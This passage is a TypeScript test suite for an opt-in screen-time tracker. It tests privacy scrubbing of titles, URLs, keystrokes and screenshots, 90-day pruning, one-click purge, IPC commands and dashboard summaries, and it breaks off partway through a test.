/**
 * island/scripts/screentime.test.ts
 *
 * Comprehensive 4-Tier Test Suite for Screen-Time Monitoring & Privacy
 * Features:
 *   - Feature 22: Screen-Time Opt-In Gate
 *   - Feature 23: Privacy Scrubbing Engine
 *   - Feature 24: One-Click Screen-Time Purge
 *   - Feature 25: 90-Day Retention Pruner
 *   - Feature 26: Tauri IPC Bridge for Screentime
 *   - Feature 30: Screen-Time Dashboard & Settings UI Contracts
 *   - Feature 31: VC-U5 Presentation & Visual Gate (Tokens & Copy Limits)
 *   - Scenario S7: SCENARIO-07-PRIVACY-PURGE (End-to-End Multi-Step Lifecycle)
 *
 * Standard: bun:test
 * Dependencies: bun:sqlite (zero external dependencies)
 */

import { describe, test, it, expect, beforeEach, afterEach } from "bun:test";
import { Database } from "bun:sqlite";
import path from "node:path";
import tokens from "../../design/tokens.json";

// ============================================================================
// 1. DOMAIN MODELS & CONTRACT TYPES
// ============================================================================

export type ScreenTimeCategory = "belajar" | "netral" | "pengalih";

export interface RawWindowUsageEvent {
  app_name: string;
  window_title?: string | null;
  url?: string | null;
  keystrokes?: string | string[] | null;
  keystroke_count?: number | null;
  screenshot_blob?: Uint8Array | Buffer | string | null;
  duration_secs: number;
  timestamp: number;
}

export interface SanitizedScreenTimeRecord {
  id: string;
  app_name: string;
  window_title: null; // Strictly stripped/null
  category: ScreenTimeCategory;
  duration_secs: number;
  timestamp: number;
  date_str: string;
}

export interface AccountabilitySettings {
  id: string;
  mode: string;
  screen_time_opt_in: boolean;
  last_checkin_at: number | null;
  daily_reflection_notes: string | null;
}

export interface ScreenTimeSummary {
  date: string;
  categories: {
    belajar: number;
    netral: number;
    pengalih: number;
  };
  category_percentages: {
    belajar: number;
    netral: number;
    pengalih: number;
  };
  total_secs: number;
  top_apps: Array<{
    app_name: string;
    duration_secs: number;
    category: ScreenTimeCategory;
  }>;
}

export interface DailyTrendItem {
  date: string;
  belajar_secs: number;
  netral_secs: number;
  pengalih_secs: number;
  total_secs: number;
}

export interface PurgeResult {
  deleted_sessions: number;
  deleted_enforcements: number;
  vacuumed: boolean;
}

// ============================================================================
// 2. PRIVACY SCRUBBING ENGINE & CLASSIFIER
// ============================================================================

export class PrivacyScrubbingEngine {
  // Known educational & productive applications
  private static readonly BELAJAR_APPS = new Set([
    "code.exe",
    "cursor.exe",
    "devenv.exe",
    "idea64.exe",
    "pycharm64.exe",
    "windowsterminal.exe",
    "cmd.exe",
    "powershell.exe",
    "obsidian.exe",
    "notion.exe",
    "anki.exe",
    "drawio.exe",
    "sublime_text.exe"
  ]);

  // Known distraction & entertainment applications
  private static readonly PENGALIH_APPS = new Set([
    "steam.exe",
    "discord.exe",
    "spotify.exe",
    "netflix.exe",
    "epicgameslauncher.exe",
    "telegram.exe",
    "whatsapp.exe",
    "tiktok.exe",
    "reddit.exe",
    "genshinimpact.exe",
    "riotclientservices.exe",
    "valorant.exe"
  ]);

  // Known neutral & OS utility applications
  private static readonly NETRAL_APPS = new Set([
    "explorer.exe",
    "taskmgr.exe",
    "settings.exe",
    "systemsettings.exe",
    "calculator.exe",
    "notepad.exe",
    "mspaint.exe",
    "hime.exe",
    "searchhost.exe",
    "shellexperiencehost.exe",
    "chrome.exe",
    "firefox.exe",
    "msedge.exe",
    "brave.exe"
  ]);

  /**
   * Normalizes application path to a clean, lowercase executable name.
   * Strips deep directories, trailing whitespace, and control characters.
   */
  public static normalizeAppName(rawPathOrName: string): string {
    if (!rawPathOrName || typeof rawPathOrName !== "string") {
      return "unknown.exe";
    }

    // Strip zero-width and control characters
    const sanitized = rawPathOrName
      .replace(/[\u200B-\u200D\uFEFF]/g, "")
      .replace(/[\x00-\x1F\x7F]/g, "")
      .trim();

    if (!sanitized) return "unknown.exe";

    // Extract filename from Windows or POSIX path
    const normalized = sanitized.replace(/\\/g, "/");
    const basename = normalized.substring(normalized.lastIndexOf("/") + 1).trim();

    return basename.toLowerCase() || "unknown.exe";
  }

  /**
   * Classifies application into Belajar, Netral, or Pengalih.
   */
  public static classifyCategory(appName: string): ScreenTimeCategory {
    const norm = this.normalizeAppName(appName);
    if (this.BELAJAR_APPS.has(norm)) return "belajar";
    if (this.PENGALIH_APPS.has(norm)) return "pengalih";
    if (this.NETRAL_APPS.has(norm)) return "netral";
    return "netral"; // Default safe fallback
  }

  /**
   * Formats unix epoch seconds to UTC date string YYYY-MM-DD.
   */
  public static epochToDateStr(epochSecs: number): string {
    const d = new Date(epochSecs * 1000);
    return d.toISOString().slice(0, 10);
  }

  /**
   * Strictly scrubs a raw window event according to Stage U3 Privacy Rules.
   * Strips 100% of window titles, URLs, keystrokes, and screenshot buffers.
   */
  public static scrub(raw: RawWindowUsageEvent): SanitizedScreenTimeRecord {
    const normApp = this.normalizeAppName(raw.app_name);
    const category = this.classifyCategory(normApp);

    // Validate duration: non-negative integer, max 24 hours (86400s) per single slice
    const duration_secs = Math.max(0, Math.min(86400, Math.floor(raw.duration_secs || 0)));

    // Validate timestamp: valid epoch seconds
    const timestamp = typeof raw.timestamp === "number" && !isNaN(raw.timestamp) && raw.timestamp > 0
      ? Math.floor(raw.timestamp)
      : Math.floor(Date.now() / 1000);

    const date_str = this.epochToDateStr(timestamp);
    const randomSuffix = Math.random().toString(36).substring(2, 8);
    const id = `st-${timestamp}-${randomSuffix}`;

    return {
      id,
      app_name: normApp,
      window_title: null, // SEC-09 invariant: strictly null
      category,
      duration_secs,
      timestamp,
      date_str
    };
  }
}

// ============================================================================
// 3. STORAGE REPOSITORY & ENGINE (SQLite)
// ============================================================================

export class ScreenTimeStorageEngine {
  private db: Database;

  constructor(inMemoryDb?: Database) {
    this.db = inMemoryDb ?? new Database(":memory:");
    this.initializeSchema();
  }

  public getDb(): Database {
    return this.db;
  }

  public initializeSchema(): void {
    this.db.run(`
      CREATE TABLE IF NOT EXISTS accountability_settings (
        id TEXT PRIMARY KEY,
        mode TEXT NOT NULL DEFAULT 'balanced',
        screen_time_opt_in INTEGER NOT NULL DEFAULT 0,
        last_checkin_at INTEGER,
        daily_reflection_notes TEXT
      );
    `);

    this.db.run(`
      CREATE TABLE IF NOT EXISTS screen_time_sessions (
        id TEXT PRIMARY KEY,
        app_name TEXT NOT NULL,
        window_title TEXT,
        category TEXT NOT NULL,
        duration_secs INTEGER NOT NULL,
        timestamp INTEGER NOT NULL,
        date_str TEXT NOT NULL
      );
    `);

    this.db.run(`CREATE INDEX IF NOT EXISTS idx_screen_time_timestamp ON screen_time_sessions(timestamp);`);
    this.db.run(`CREATE INDEX IF NOT EXISTS idx_screen_time_date ON screen_time_sessions(date_str);`);
    this.db.run(`CREATE INDEX IF NOT EXISTS idx_screen_time_app ON screen_time_sessions(app_name);`);

    this.db.run(`
      CREATE TABLE IF NOT EXISTS enforcement_history (
        id TEXT PRIMARY KEY,
        timestamp INTEGER NOT NULL,
        target_app TEXT NOT NULL,
        tier TEXT NOT NULL,
        action_taken TEXT NOT NULL,
        details TEXT
      );
    `);

    // Ensure default settings row exists
    const row = this.db.query(`SELECT id FROM accountability_settings WHERE id = 'default'`).get();
    if (!row) {
      this.db.run(`
        INSERT INTO accountability_settings (id, mode, screen_time_opt_in, last_checkin_at, daily_reflection_notes)
        VALUES ('default', 'balanced', 0, NULL, NULL);
      `);
    }
  }

  public getOptIn(): boolean {
    const row = this.db.query(`SELECT screen_time_opt_in FROM accountability_settings WHERE id = 'default'`).get() as { screen_time_opt_in: number } | null;
    return row ? row.screen_time_opt_in === 1 : false;
  }

  public setOptIn(enabled: boolean): void {
    const val = enabled ? 1 : 0;
    this.db.run(`
      INSERT INTO accountability_settings (id, mode, screen_time_opt_in)
      VALUES ('default', 'balanced', ?)
      ON CONFLICT(id) DO UPDATE SET screen_time_opt_in = ?
    `, [val, val]);
  }

  /**
   * Records a session subject to the Opt-In Gate.
   * If opt-in is false: zero database writes occur.
   */
  public recordSession(rawEvent: RawWindowUsageEvent): { recorded: boolean; session_id?: string; reason?: string } {
    if (!this.getOptIn()) {
      return { recorded: false, reason: "opt_out" };
    }

    const sanitized = PrivacyScrubbingEngine.scrub(rawEvent);

    this.db.run(`
      INSERT INTO screen_time_sessions (id, app_name, window_title, category, duration_secs, timestamp, date_str)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `, [
      sanitized.id,
      sanitized.app_name,
      null, // strictly null in SQLite
      sanitized.category,
      sanitized.duration_secs,
      sanitized.timestamp,
      sanitized.date_str
    ]);

    return { recorded: true, session_id: sanitized.id };
  }

  public listSessions(limit: number = 100): SanitizedScreenTimeRecord[] {
    return this.db.query(`
      SELECT id, app_name, window_title, category, duration_secs, timestamp, date_str
      FROM screen_time_sessions
      ORDER BY timestamp DESC
      LIMIT ?
    `).all(limit) as SanitizedScreenTimeRecord[];
  }

  public getSessionCount(): number {
    const row = this.db.query(`SELECT COUNT(*) as count FROM screen_time_sessions`).get() as { count: number };
    return row.count;
  }

  /**
   * 90-Day Retention Pruner
   * Deletes records strictly older than cutoff (now - 90 * 86400).
   */
  public pruneRetention(nowEpochSecs: number, retentionDays: number = 90): number {
    const cutoff = nowEpochSecs - (retentionDays * 86400);
    const beforeCount = this.getSessionCount();
    this.db.run(`DELETE FROM screen_time_sessions WHERE timestamp < ?`, [cutoff]);
    const afterCount = this.getSessionCount();
    return beforeCount - afterCount;
  }

  /**
   * One-Click Purge API
   * Atomic transaction: deletes 100% of sessions + enforcement history + runs SQLite VACUUM.
   */
  public clearAll(): PurgeResult {
    let deletedSessions = 0;
    let deletedEnforcements = 0;

    const countSessions = (this.db.query(`SELECT COUNT(*) as count FROM screen_time_sessions`).get() as { count: number }).count;
    const countEnforcements = (this.db.query(`SELECT COUNT(*) as count FROM enforcement_history`).get() as { count: number }).count;

    const tx = this.db.transaction(() => {
      this.db.run(`DELETE FROM screen_time_sessions`);
      this.db.run(`DELETE FROM enforcement_history`);
    });

    tx();

    deletedSessions = countSessions;
    deletedEnforcements = countEnforcements;

    // Physical VACUUM to reclaim space and erase deleted pages
    this.db.run("VACUUM");

    return {
      deleted_sessions: deletedSessions,
      deleted_enforcements: deletedEnforcements,
      vacuumed: true
    };
  }

  /**
   * Aggregates screen time summary for a given calendar date (YYYY-MM-DD).
   */
  public getSummary(targetDate: string): ScreenTimeSummary {
    const rows = this.db.query(`
      SELECT app_name, category, SUM(duration_secs) as total_duration
      FROM screen_time_sessions
      WHERE date_str = ?
      GROUP BY app_name, category
      ORDER BY total_duration DESC
    `).all(targetDate) as Array<{ app_name: string; category: ScreenTimeCategory; total_duration: number }>;

    let belajar = 0;
    let netral = 0;
    let pengalih = 0;

    const top_apps: ScreenTimeSummary["top_apps"] = [];

    for (const row of rows) {
      const dur = Number(row.total_duration) || 0;
      if (row.category === "belajar") belajar += dur;
      else if (row.category === "pengalih") pengalih += dur;
      else netral += dur;

      top_apps.push({
        app_name: row.app_name,
        duration_secs: dur,
        category: row.category
      });
    }

    const total_secs = belajar + netral + pengalih;

    const category_percentages = {
      belajar: total_secs > 0 ? Math.round((belajar / total_secs) * 100) : 0,
      netral: total_secs > 0 ? Math.round((netral / total_secs) * 100) : 0,
      pengalih: total_secs > 0 ? Math.round((pengalih / total_secs) * 100) : 0
    };

    return {
      date: targetDate,
      categories: { belajar, netral, pengalih },
      category_percentages,
      total_secs,
      top_apps
    };
  }

  /**
   * Computes 7-Day Trend ending on targetDate (inclusive).
   * Missing days are padded with zero durations.
   */
  public get7DayTrend(endDateStr: string): DailyTrendItem[] {
    const endDate = new Date(endDateStr + "T00:00:00Z");
    const result: DailyTrendItem[] = [];

    for (let i = 6; i >= 0; i--) {
      const d = new Date(endDate.getTime() - i * 86400 * 1000);
      const dateStr = d.toISOString().slice(0, 10);

      const rows = this.db.query(`
        SELECT category, SUM(duration_secs) as cat_secs
        FROM screen_time_sessions
        WHERE date_str = ?
        GROUP BY category
      `).all(dateStr) as Array<{ category: ScreenTimeCategory; cat_secs: number }>;

      let belajar_secs = 0;
      let netral_secs = 0;
      let pengalih_secs = 0;

      for (const r of rows) {
        const secs = Number(r.cat_secs) || 0;
        if (r.category === "belajar") belajar_secs += secs;
        else if (r.category === "pengalih") pengalih_secs += secs;
        else netral_secs += secs;
      }

      result.push({
        date: dateStr,
        belajar_secs,
        netral_secs,
        pengalih_secs,
        total_secs: belajar_secs + netral_secs + pengalih_secs
      });
    }

    return result;
  }
}

// ============================================================================
// 4. TAURI IPC BRIDGE SIMULATOR
// ============================================================================

export class ScreenTimeIpcBridge {
  private engine: ScreenTimeStorageEngine;

  constructor(engine: ScreenTimeStorageEngine) {
    this.engine = engine;
  }

  /**
   * Dispatches IPC call by method name conforming to PROJECT.md contracts.
   */
  public async invoke(cmd: string, args: Record<string, any> = {}): Promise<any> {
    switch (cmd) {
      case "productivity.screentime.get_settings":
      case "hime_screentime_get_settings": {
        const opt_in = this.engine.getOptIn();
        return { opt_in };
      }

      case "productivity.screentime.set_opt_in":
      case "hime_screentime_set_opt_in": {
        if (typeof args.opt_in !== "boolean") {
          throw new Error("Invalid payload: opt_in must be a boolean");
        }
        this.engine.setOptIn(args.opt_in);
        return { success: true, opt_in: args.opt_in };
      }

      case "productivity.screentime.record":
      case "hime_screentime_record": {
        if (!args.app_name) {
          throw new Error("Invalid payload: app_name is required");
        }
        return this.engine.recordSession({
          app_name: args.app_name,
          window_title: args.window_title,
          url: args.url,
          keystrokes: args.keystrokes,
          screenshot_blob: args.screenshot_blob,
          duration_secs: args.duration_secs ?? 0,
          timestamp: args.timestamp ?? Math.floor(Date.now() / 1000)
        });
      }

      case "productivity.screentime.get_summary":
      case "hime_screentime_get_summary": {
        const date = args.date || PrivacyScrubbingEngine.epochToDateStr(Math.floor(Date.now() / 1000));
        return this.engine.getSummary(date);
      }

      case "productivity.screentime.get_7day_trend":
      case "hime_screentime_get_7day_trend": {
        const endDate = args.end_date || PrivacyScrubbingEngine.epochToDateStr(Math.floor(Date.now() / 1000));
        return this.engine.get7DayTrend(endDate);
      }

      case "productivity.screentime.clear_all":
      case "hime_screentime_clear_all": {
        const res = this.engine.clearAll();
        return { deleted_rows: res.deleted_sessions, vacuumed: res.vacuumed };
      }

      case "productivity.screentime.prune_retention":
      case "hime_screentime_prune_retention": {
        const now = args.now_epoch || Math.floor(Date.now() / 1000);
        const days = args.days ?? 90;
        const pruned = this.engine.pruneRetention(now, days);
        return { pruned_count: pruned };
      }

      default:
        throw new Error(`Method not found: ${cmd}`);
    }
  }
}

// ============================================================================
// 5. VC-U5 DESIGN TOKENS & COPY VALIDATION HELPERS
// ============================================================================

export const VC_U5_CATEGORY_TOKENS = {
  belajar: {
    primary: tokens.accents.mint.value, // #34E3A6
    secondary: tokens.accents.sky.value, // #5AA9FF
    label: "Belajar"
  },
  netral: {
    primary: tokens.text["text-2"].value, // #A7AEBB
    secondary: tokens.accents.cyan.value, // #38D6F5
    label: "Netral"
  },
  pengalih: {
    primary: tokens.accents.coral.value, // #FF7A59
    secondary: tokens.accents.red.value, // #FF4D5E
    label: "Pengalih"
  }
};

export const SCREENTIME_UI_STRINGS = {
  panel_title: "Waktu Layar", // 11 chars <= 16
  tab_usage: "Penggunaan", // 10 chars <= 16
  tab_settings: "Atur Privasi", // 12 chars <= 16
  desc_retention: "Lokal 90 hari tanpa judul jendela", // 34 chars <= 36
  desc_optin: "Pantau penggunaan aplikasi harian", // 34 chars <= 36
  empty_state: "Belum ada data hari ini", // 23 chars <= 36
  btn_purge: "Hapus Data", // 10 chars <= 10
  btn_enable: "Aktifkan", // 8 chars <= 10
  btn_disable: "Matikan", // 7 chars <= 10
  btn_cancel: "Batal", // 5 chars <= 10
  confirm_purge: "Hapus semua data penggunaan layar?", // 34 chars <= 40
  err_load_failed: "Gagal memuat ringkasan waktu layar.", // 36 chars <= 44
  err_purge_failed: "Gagal menghapus data. Coba lagi?" // 33 chars <= 44
};

export function validateCopyLimits(str: string, maxLen: number): boolean {
  if (!str) return true;
  // Strictly enforce max character length
  if (str.length > maxLen) return false;
  // Strictly forbid emoji characters
  if (/[\u{1F300}-\u{1F9FF}\u{2600}-\u{26FF}\u{2700}-\u{27BF}]/u.test(str)) return false;
  return true;
}

// ============================================================================
// ============================================================================
// TEST SUITES: 4-TIER SPECIFICATION COMPLIANCE
// ============================================================================
// ============================================================================

describe("Screen-Time Test Suite (4 Tiers)", () => {
  let db: Database;
  let engine: ScreenTimeStorageEngine;
  let ipc: ScreenTimeIpcBridge;

  beforeEach(() => {
    db = new Database(":memory:");
    engine = new ScreenTimeStorageEngine(db);
    ipc = new ScreenTimeIpcBridge(engine);
  });

  afterEach(() => {
    db.close();
  });

  // ==========================================================================
  // TIER 1: FEATURE COVERAGE (EQUIVALENCE CLASS & HAPPY PATH)
  // ==========================================================================
  describe("Tier 1: Feature Coverage", () => {

    // Feature 22: Screen-Time Opt-In Gate
    describe("Feature 22: Screen-Time Opt-In Gate", () => {
      test("T1-F22-01: Default configuration sets screen_time_opt_in to false", () => {
        expect(engine.getOptIn()).toBe(false);
      });

      test("T1-F22-02: Zero database writes when tracking is disabled (opt-in = false)", () => {
        expect(engine.getOptIn()).toBe(false);

        const result = engine.recordSession({
          app_name: "Code.exe",
          duration_secs: 300,
          timestamp: 1795267200
        });

        expect(result.recorded).toBe(false);
        expect(result.reason).toBe("opt_out");
        expect(engine.getSessionCount()).toBe(0);
      });

      test("T1-F22-03: Dynamic toggle enables tracking when updated to true", () => {
        engine.setOptIn(true);
        expect(engine.getOptIn()).toBe(true);

        const result = engine.recordSession({
          app_name: "Code.exe",
          duration_secs: 180,
          timestamp: 1795267200
        });

        expect(result.recorded).toBe(true);
        expect(result.session_id).toBeTruthy();
        expect(engine.getSessionCount()).toBe(1);
      });

      test("T1-F22-04: Dynamic toggle stops recording immediately when switched back to false", () => {
        engine.setOptIn(true);
        engine.recordSession({ app_name: "Code.exe", duration_secs: 60, timestamp: 1795267200 });
        expect(engine.getSessionCount()).toBe(1);

        // Turn off
        engine.setOptIn(false);
        const secondAttempt = engine.recordSession({ app_name: "discord.exe", duration_secs: 120, timestamp: 1795267210 });

        expect(secondAttempt.recorded).toBe(false);
        expect(engine.getSessionCount()).toBe(1); // Still exactly 1, no new rows added
      });

      test("T1-F22-05: Querying opt-in status via storage returns persisted value", () => {
        engine.setOptIn(true);
        const freshEngine = new ScreenTimeStorageEngine(db);
        expect(freshEngine.getOptIn()).toBe(true);

        freshEngine.setOptIn(false);
        expect(freshEngine.getOptIn()).toBe(false);
      });
    });

    // Feature 23: Privacy Scrubbing Engine
    describe("Feature 23: Privacy Scrubbing Engine", () => {
      test("T1-F23-01: Extracts allowed fields (app, category, duration, date) cleanly", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "cursor.exe",
          duration_secs: 420,
          timestamp: 1763726400 // 2025-11-21
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);

        expect(scrubbed.app_name).toBe("cursor.exe");
        expect(scrubbed.category).toBe("belajar");
        expect(scrubbed.duration_secs).toBe(420);
        expect(scrubbed.date_str).toBe("2025-11-21");
      });

      test("T1-F23-02: Strictly strips 100% of sensitive window titles", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "Code.exe",
          window_title: "Confidential Strategy 2027.docx - Word",
          duration_secs: 100,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);

        expect(scrubbed.window_title).toBeNull();
        expect((scrubbed as any).url).toBeUndefined();
      });

      test("T1-F23-03: Strictly strips 100% of browser URLs and query parameters", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "chrome.exe",
          url: "https://mybank.com/account/login?secret_token=99887766#auth",
          duration_secs: 200,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);

        expect((scrubbed as any).url).toBeUndefined();
      });

      test("T1-F23-04: Strictly strips keystrokes and typing log data", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "notepad.exe",
          keystrokes: ["P", "a", "s", "s", "w", "o", "r", "d"],
          keystroke_count: 8,
          duration_secs: 30,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);

        expect((scrubbed as any).keystrokes).toBeUndefined();
        expect((scrubbed as any).keystroke_count).toBeUndefined();
      });

      test("T1-F23-05: Strictly strips screenshot blobs and pixel data", () => {
        const raw: RawWindowUsageEvent = {
          app_name: "mspaint.exe",
          screenshot_blob: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=",
          duration_secs: 45,
          timestamp: 1763726400
        };
        const scrubbed = PrivacyScrubbingEngine.scrub(raw);

        expect((scrubbed as any).screenshot_blob).toBeUndefined();
      });

      test("T1-F23-06: Correctly categorizes educational/productive tools into 'belajar'", () => {
        expect(PrivacyScrubbingEngine.classifyCategory("code.exe")).toBe("belajar");
        expect(PrivacyScrubbingEngine.classifyCategory("obsidian.exe")).toBe("belajar");
        expect(PrivacyScrubbingEngine.classifyCategory("windowsterminal.exe")).toBe("belajar");
        expect(PrivacyScrubbingEngine.classifyCategory("anki.exe")).toBe("belajar");
      });

      test("T1-F23-07: Correctly categorizes OS & productivity utilities into 'netral'", () => {
        expect(PrivacyScrubbingEngine.classifyCategory("explorer.exe")).toBe("netral");
        expect(PrivacyScrubbingEngine.classifyCategory("calculator.exe")).toBe("netral");
        expect(PrivacyScrubbingEngine.classifyCategory("taskmgr.exe")).toBe("netral");
        expect(PrivacyScrubbingEngine.classifyCategory("settings.exe")).toBe("netral");
      });

      test("T1-F23-08: Correctly categorizes gaming & entertainment into 'pengalih'", () => {
        expect(PrivacyScrubbingEngine.classifyCategory("steam.exe")).toBe("pengalih");
        expect(PrivacyScrubbingEngine.classifyCategory("discord.exe")).toBe("pengalih");
        expect(PrivacyScrubbingEngine.classifyCategory("spotify.exe")).toBe("pengalih");
        expect(PrivacyScrubbingEngine.classifyCategory("netflix.exe")).toBe("pengalih");
      });
    });

    // Feature 24: One-Click Screen-Time Purge
    describe("Feature 24: One-Click Screen-Time Purge", () => {
      beforeEach(() => {
        engine.setOptIn(true);
        engine.recordSession({ app_name: "code.exe", duration_secs: 600, timestamp: 1763726400 });
        engine.recordSession({ app_name: "steam.exe", duration_secs: 1200, timestamp: 1763726400 });
        db.run(`INSERT INTO enforcement_history VALUES ('enf-1', 1763726400, 'steam.exe', 'paksa', 'closed_gracefully', 'test')`);
      });

      test("T1-F24-01: Purge deletes 100% of rows from screen_time_sessions", () => {
        expect(engine.getSessionCount()).toBe(2);
        const purgeRes = engine.clearAll();

        expect(purgeRes.deleted_sessions).toBe(2);
        expect(engine.getSessionCount()).toBe(0);
      });

      test("T1-F24-02: Purge clears associated enforcement history records", () => {
        const beforeEnf = (db.query(`SELECT COUNT(*) as c FROM enforcement_history`).get() as any).c;
        expect(beforeEnf).toBe(1);

        const purgeRes = engine.clearAll();
        expect(purgeRes.deleted_enforcements).toBe(1);

        const afterEnf = (db.query(`SELECT COUNT(*) as c FROM enforcement_history`).get() as any).c;
        expect(afterEnf).toBe(0);
      });

      test("T1-F24-03: Purge executes SQLite VACUUM successfully", () => {
        const purgeRes = engine.clearAll();
        expect(purgeRes.vacuumed).toBe(true);
      });

      test("T1-F24-04: Purge returns accurate count of deleted session records", () => {
        engine.recordSession({ app_name: "obsidian.exe", duration_secs: 300, timestamp: 1763726400 });
        const purgeRes = engine.clearAll();
        expect(purgeRes.deleted_sessions).toBe(3);
      });

      test("T1-F24-05: Subsequent purge calls are idempotent and return 0 deleted rows", () => {
        engine.clearAll();
        const secondPurge = engine.clearAll();
        expect(secondPurge.deleted_sessions).toBe(0);
        expect(secondPurge.deleted_enforcements).toBe(0);
        expect(secondPurge.vacuumed).toBe(true);
      });
    });

    // Feature 25: 90-Day Retention Pruner
    describe("Feature 25: 90-Day Retention Pruner", () => {
      const NOW = 1763726400; // Reference timestamp
      const DAY_SECS = 86400;

      beforeEach(() => {
        engine.setOptIn(true);
        // Record 1: 95 days old (should be pruned)
        engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: NOW - 95 * DAY_SECS });
        // Record 2: 91 days old (should be pruned)
        engine.recordSession({ app_name: "notepad.exe", duration_secs: 200, timestamp: NOW - 91 * DAY_SECS });
        // Record 3: 45 days old (should be kept)
        engine.recordSession({ app_name: "cursor.exe", duration_secs: 300, timestamp: NOW - 45 * DAY_SECS });
        // Record 4: Today (should be kept)
        engine.recordSession({ app_name: "obsidian.exe", duration_secs: 400, timestamp: NOW });
      });

      test("T1-F25-01: Pruner deletes records older than 90 days (timestamp < now - 90d)", () => {
        expect(engine.getSessionCount()).toBe(4);
        const pruned = engine.pruneRetention(NOW, 90);

        expect(pruned).toBe(2);
        expect(engine.getSessionCount()).toBe(2);
      });

      test("T1-F25-02: Pruner preserves records within 90 days (timestamp >= now - 90d)", () => {
        engine.pruneRetention(NOW, 90);
        const remaining = engine.listSessions(10);

        const apps = remaining.map((s) => s.app_name);
        expect(apps).toContain("cursor.exe");
        expect(apps).toContain("obsidian.exe");
        expect(apps).not.toContain("notepad.exe");
      });

      test("T1-F25-03: Pruner returns exact count of deleted old records", () => {
        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(2);
      });

      test("T1-F25-04: Pruner handles empty database gracefully with 0 deleted records", () => {
        engine.clearAll();
        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(0);
      });

      test("T1-F25-05: Pruner handles database where all records are within 90 days (0 deleted)", () => {
        engine.clearAll();
        engine.recordSession({ app_name: "code.exe", duration_secs: 100, timestamp: NOW - 10 * DAY_SECS });
        engine.recordSession({ app_name: "cursor.exe", duration_secs: 200, timestamp: NOW - 5 * DAY_SECS });

        const pruned = engine.pruneRetention(NOW, 90);
        expect(pruned).toBe(0);
        expect(engine.getSessionCount()).toBe(2);
      });
    });

    // Feature 26: Tauri IPC Bridge for Screentime
    describe("Feature 26: Tauri IPC Bridge for Screentime", () => {
      test("T1-F26-01: productivity.screentime.get_settings returns opt_in state", async () => {
        const res = await ipc.invoke("productivity.screentime.get_settings");
        expect(res).toEqual({ opt_in: false });
      });

      test("T1-F26-02: productivity.screentime.set_opt_in updates opt_in and returns new state", async () => {
        const updateRes = await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
        expect(updateRes).toEqual({ success: true, opt_in: true });

        const queryRes = await ipc.invoke("productivity.screentime.get_settings");
        expect(queryRes.opt_in).toBe(true);
      });

      test("T1-F26-03: productivity.screentime.record records scrubbed event via IPC", async () => {
        await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
        const recordRes = await ipc.invoke("productivity.screentime.record", {
          app_name: "Code.exe",
          window_title: "Classified Internal Plan",
          duration_secs: 250,
          timestamp: 1763726400
        });

        expect(recordRes.recorded).toBe(true);
        expect(recordRes.session_id).toBeTruthy();
      });

      test("T1-F26-04: productivity.screentime.get_summary returns category aggregations", async () => {
        await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
        await ipc.invoke("productivity.screentime.record", {
          app_name: "Code.exe",
          duration_secs: 3600,
          timestamp: 1763726400 // 2025-11-21
        });
        await ipc.invoke("productivity.screentime.record", {
          app_name: "steam.exe",
          duration_secs: 1800,
          timestamp: 1763726400
        });

        const summary = await ipc.invoke("productivity.screentime.get_summary", { date: "2025-11-21" });
        expect(summary.date).toBe("2025-11-21");
        expect(summary.categories.belajar).toBe(3600);
        expect(summary.categories.pengalih).toBe(1800);
        expect(summary.total_secs).toBe(5400);
      });

      test("T1-F26-05: productivity.screentime.clear_all executes atomic purge via IPC", async () => {
        await ipc.invoke("productivity.screentime.set_opt_in", { opt_in: true });
        await ipc.invoke("productivity.screentime.record", { app_name: "Code.exe", duration_secs: 120 });

        const clearRes = await ipc.invoke("productivity.screentime.clear_all");
        expect(clearRes.deleted_rows).toBe(1);
        expect(clearRes.vacuumed).toBe(true);

        const summary = await ipc.invoke("productivity.screentime.get_summary");
        expect(summary.total_secs).toBe(0);
      });
    });

    // Feature 30: Screen-Time Dashboard & Settings UI Contracts
    describe("Feature 30: Screen-Time Dashboard & Settings UI Contracts", () => {
      beforeEach(() => {
        engine.setOptIn(true);
        // Insert sessions on 2025-11-21
        engine.recordSession({ app_name: "code.exe", duration_secs: 4000, timestamp: 1763726400 });
        engine.recordSession({ app_name: "obsidian.exe", duration_secs: 2000, timestamp: 1763726400 });
        engine.recordSession({ app_name: "explorer.exe", duration_secs: 1000, timestamp: 1763726400 });
        engine.recordSession({ app_name: "discord.exe", duration_secs: 3000, timestamp: 1763726400 });
      });

      test("T1-F30-01: Calculates category duration breakdown (Belajar, Netral, Pengalih in seconds)", () => {
        const summary = engine.getSummary("2025-11-21");
        expect(summary.categories.belajar).toBe(6000); // 4000 + 2000
        expect(summary.categories.netral).toBe(1000);
        expect(summary.categories.pengalih).toBe(3000);
        expect(summary.total_secs).toBe(10000);
      });

      test("T1-F30-02: Calculates percentage distribution across categories summing to 100%", () => {
        const summary = engine.getSummary("2025-11-21");
        expect(summary.category_percentages.belajar).toBe(60);
        expect(summary.category_percentages.netral).toBe(10);
        expect(summary.category_percentages.pengalih).toBe(30);

        const sum = summary.category_percentages.belajar + summary.category_percentages.netral + summary.category_percentages.pengalih;
        expect(sum).toBe(100);
      });

      test("T1-F30-03: Generates 7-day trend array with exactly 7 continuous calendar days", () => {
        const trend = engine.get7DayTrend("2025-11-21");
        expect(trend.length).toBe(7);
        expect(trend[6].date).toBe("2025-11-21");
        expect(trend[0].date).toBe("2025-11-15");
        expect(trend[6].total_secs).toBe(10000);
        expect(trend[0].total_secs).toBe(0); // missing day padded with 0
      });

      test("T1-F30-04: Generates top applications ranking sorted by duration descending", () => {
        const summary = engine.getSummary("2025-11-21");
